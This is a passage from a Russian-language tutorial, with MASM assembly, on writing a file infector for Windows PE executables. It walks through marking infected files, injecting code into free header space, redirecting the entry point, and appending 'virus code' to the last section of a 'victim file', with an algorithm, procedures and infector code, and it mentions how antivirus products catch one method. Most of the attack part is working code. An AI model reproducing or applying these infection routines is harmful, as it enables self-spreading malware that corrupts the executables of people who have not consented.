&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>Win32VersionValue==<span style="color: #ff0000;">00BADF11Eh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; MB_ICONERROR<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset TitleMes1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; offset Error2Str<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; MessageBox<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; Exit<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp;</div>
<p>Для индикатора зараженности подойдет любое поле, которое не используется загрузчиком. Я описывал ранее, какие это поля. Если посмотреть внимательно на какой-нибудь PE-файл с Bound-импортом, то обычно Bound-импорт помещается как раз в это свободное пространство нужное нам. Bound-импорт - средство оптимизации загрузки. Но если его удалить, то файл будет все равно нормально загружаться.</p>
<p>Теперь надо найти начало свободного пространства в заголовке. Это пространство будет начинаться сразу после таблицы секций. Посмотрите на код и мои комментарии:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Поиск конца таблицы секций+1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pFileHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>NumberOfSections<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>sizeof IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mul</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;теперь в eax - количество байт, которые занимают все секции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pSectionTable<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;теперь в edi - начало промежутка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;сохраняем начало промежутка</span><br />
&nbsp;</div>
<p>Чтобы получить начало первой секции в файле надо пройтись по всем секциям и сохранить минимальное физическое смещение. Мы делаем это для того, что в таблице секций, первая запись не обязательно соответствует первой секции в файле. Иначе можно было бы взять информацию из первой записи в таблице секций. Чаще, в конечном итоге, так и получается. Вот исходный делающий эти операции:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Поиск физического смещения первой секции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pFileHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>NumberOfSections<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pSectionTable<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;в eax - физическое смещение 1 секции в таблице секций</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_SECTION_HEADER<br />
NextSection<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>&gt;<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; NextSection<br />
&nbsp;</div>
<p>После проекции, проверки EXE-файла и получения информации о промежутке в заголовке проецируем файл, откуда берутся данные, которые надо внедрять. Потом проверяем размер промежутка и размер файла. Если размер промежутка достаточен для кода, то можно внедрять. Код внедряем обычными цепочечными командами ассемблера:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Запись</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;количество байт для записи</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>AddressOfCode<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>hMap2<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;запись!</span><br />
&nbsp;</div>
<p>После данных из файла необходимо поставить переход на нормальную точку входа. Я делаю это следующими инструкциями:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EDI</span><span style="color: #339933;">,</span>&lt;Старая_точка_входа<span style="color: #339933;">+</span><span style="color: #0000ff; font-weight: bold;">ImageBase</span>&gt;&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;BFXXXXXXXX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;FFE7</span><br />
&nbsp;</div>
<p>Далее программа модифицирует точку входа. Параметр SizeOfHeaders очень важен для нас. Он должен быть равен физическому смещению последней секции. Иначе загрузчик не спроецирует код, а забьет пространство нулями. К сожалению, этот способ внедрения отлавливают все антивирусы, просто проверяя, что точка входа указывает на заголовок. Можно, например, записать код в заголовок и потом использовать его. При этом обязательно, чтобы AddressOfEntryPoint не указывал на заголовок. Т.е. можно использовать это место для хранения т.н. загрузочной процедуры, которая передает управление на соответствующие инструкции.</p>
<h3><a name="c2ac"></a>Способ 2. Запись в конец последней секции</h3>
<p>Этот способ более предпочтителен для внедрения потустороннего кода в PE-файл. Можно внедрять сколько угодно кода. Но, используя данный способ изменяется размер файла. Что в этом плохого догадайтесь сами. Способ заключается в простом добавлении кода в конец последней секции с изменением параметров для данной секции. Вот алгоритм внедрения, используя расширение последней секции:</p>
<ol>
	<li>Находим последнюю секцию виртуально и физически.</li>
	<li>Проверка, не равен ли размер последней секции нулю.</li>
	<li>Если нет, то записываем в конец секции код вируса.</li>
	<li>Выравниваем новую секцию с учетом файлового выравнивания.</li>
	<li>Правим виртуальный и физический размеры секций.</li>
	<li>Правим точку входа.</li>
	<li>Правим размер образа - ImageSize=VirtualSize+VirtualAddress</li>
	<li>Правим - характеристики - на 0А0000020h</li>
</ol>
<p>Ну как? По-моему ничего сложного. Надо просто знать, какие поля есть в PE-заголовке, и помнить о них. Здесь нам пригодиться и вычисление выравнивания секций. Как вы помните из главы 1, есть формула для вычисления, выровненного вверх или вниз, значения. Был также приведен код процедур для этих расчетов. Сейчас, я приведу код и Вам мигом все станет понятно.</p>
<h3><a name="c2ad"></a>Итоговый размер файла</h3>
<p>Первая проблема, которая возникла - это каким делать размер файла. Ведь его нужно знать до заражения. Его нужно знать, чтобы соответствующим образом спроецировать файл и чтобы хватило места в проекции для внедряемого кода. Для нового размера файла используется такая формула:</p>
<p>Y=X+AlignUp(размер_кода+7,FileAlignment),</p>
<p>где X - исходный размер файла, Y - новый размер файла, FileAlignment - файловое выравнивание для файла-жертвы.</p>
<p>Для удобства я сделал процедуру для получения файлового выравнивания. Учтите что данная процедура не сохраняет регистры. Взгляните на эту процедуру:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;==========================================================</span><br />
<span style="color: black; font-style: italic;">;Процедура GetFileAlignment</span><br />
<span style="color: black; font-style: italic;">;Получение выровненного-вверх значения</span><br />
<span style="color: black; font-style: italic;">;Вход: esi - указатель на строку с именем файла</span><br />
<span style="color: black; font-style: italic;">;Выход: eax - значение FileAlignment</span><br />
<span style="color: black; font-style: italic;">;!!!!!!!Процедура не сохраняет регистры!!!!!!!!!!!!!!</span><br />
<span style="color: black; font-style: italic;">;==========================================================</span><br />
GetFileAlignment&nbsp; &nbsp; &nbsp; &nbsp; proc<br />
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; hFile1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; LOCAL &nbsp; hMapping1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
<span style="color: black; font-style: italic;">;Create File Mapping instructions</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke CreateFile<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>GENERIC_WRITE <span style="color: #00007f; font-weight: bold;">or</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERIC_READ<span style="color: #339933;">,</span>FILE_SHARE_WRITE<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>OPEN_EXISTING<span style="color: #339933;">,</span>FILE_ATTRIBUTE_NORMAL<span style="color: #339933;">,</span>NULL<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hFile1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CreateFileMapping<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>PAGE_READWRITE<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; hMapping1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; MapViewOfFile<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>FILE_MAP_ALL_ACCESS<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
<span style="color: black; font-style: italic;">;Проверка правильности PE-файла и ошибок при проекции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ошибки при проецировании</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CloseHandle<span style="color: #339933;">,</span>hFile1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CloseHandle<span style="color: #339933;">,</span>hMapping1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; ValidPE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;EXE-файл не корректный</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; UnmapViewOfFile<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CloseHandle<span style="color: #339933;">,</span>hFile1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hMapping1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
<span style="color: black; font-style: italic;">;Получение адреса PE-заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_DOS_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>e_lfanew<br />
<span style="color: black; font-style: italic;">;Получение адреса файлового заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span><br />
<span style="color: black; font-style: italic;">;Получение адреса опционального заголовка</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_OPTIONAL_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CloseHandle<span style="color: #339933;">,</span>hFile1<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke&nbsp; CloseHandle<span style="color: #339933;">,</span>hMapping1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>FileAlignment<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
GetFileAlignment&nbsp; &nbsp; &nbsp; &nbsp; endp<br />
<span style="color: black; font-style: italic;">;==========================================================</span><br />
<span style="color: black; font-style: italic;">;Конец Процедуры GetFileAlignment</span><br />
<span style="color: black; font-style: italic;">;==========================================================</span><br />
&nbsp;</div>
<h3><a name="c2ae"></a>Код инфектора</h3>
<p>В начале работы программы она высчитывает значение размера нового файла. Потом это значение используется при проекции EXE-файла жертвы. После этого как обычно программа проходит по EXE-файла и вылавливает нужные указатели. После получения нужных данных проходим по таблице секций и выясняем, какая все-таки секция последняя. Важно, что мы смотрим не только на физическое смещение в файле, но и на виртуальное. А то может оказаться, что физически секция последняя, а виртуально нет. В этом случае если мы все-таки внедрим код, то он перепишем данные секции, которая виртуально идет после последней физически. Так что, это надо иметь ввиду. Код:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Находим последнюю секцию виртуально и физически</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pFileHeader<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_FILE_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ecx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>NumberOfSections<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>pSectionTable<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume&nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>ptr IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br />
NextSection<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">eax</span>&lt;<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData<span style="color: black;">&#41;</span>&amp;&amp;<span style="color: black;">&#40;</span><span style="color: #46aa03; font-weight: bold;">ebx</span>&lt;<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>PointerToRawData<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>VirtualAddress<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; pLastSection<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;указатель на запись о последней секции</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>sizeof IMAGE_SECTION_HEADER<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; NextSection<br />
&nbsp;</div>
<p>Далее проверяем, что найденная секция имеет не нулевой размер. Если бы секция имела бы нулевой физический размер, то это секция с неинициализированными данными. В коде приложения содержатся ссылки на эту секцию. Если мы в начало запишем наш код, то в итоге по некоторым адресам будут записываться данные. Т.о. часть нашего кода перепишется. А это нам естественно не нужно. Вот пример проверки, что найденная секция ненулевая:</p>
